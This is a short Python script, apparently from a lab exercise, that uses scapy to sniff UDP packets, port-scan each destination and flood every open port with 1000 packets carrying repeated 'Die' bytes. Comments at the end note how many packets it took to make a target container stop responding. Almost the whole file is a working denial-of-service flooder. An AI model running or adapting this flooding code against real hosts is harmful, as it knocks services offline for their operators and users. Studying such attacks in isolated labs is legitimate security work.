from scapy.all import Raw, send, IP, UDP
from PortScan import portScan

def deathByPacket(packet):

    packet.show()
    print("=== Packet Snooped ===", flush=True)
    if(IP in packet and UDP in packet):
        # payload = []
        destContainer = packet[IP].dst
        destPort = packet[UDP].dport
        print(f"\n packet dest {destContainer} and port dest {destPort}", flush=True)

        listOfOpenPorts = portScan(packet)
        print("=== Start attack ===\n")
# packet = (IP(dst="127.0.0.1") / UDP(sport=4000, dport=5000) / Raw(load=b"Waffles are better than pancakes!!!"))
        payloadSize = 1000
        rawMsg = 1000*b"Die"
        print(packet[IP].dst)
        print(listOfOpenPorts)
        for port in listOfOpenPorts:
            send(IP(dst=packet[IP].dst) / UDP(sport=packet[UDP].sport, dport=port) / Raw(load=rawMsg), count=payloadSize)
        print("=== End of attack ===\n")
#100, 150, 500 packets are not enough to take down the container
#1000 packets == 10.1 mbs of mem, apperantly
#console stopped responding after 1000 packets

        


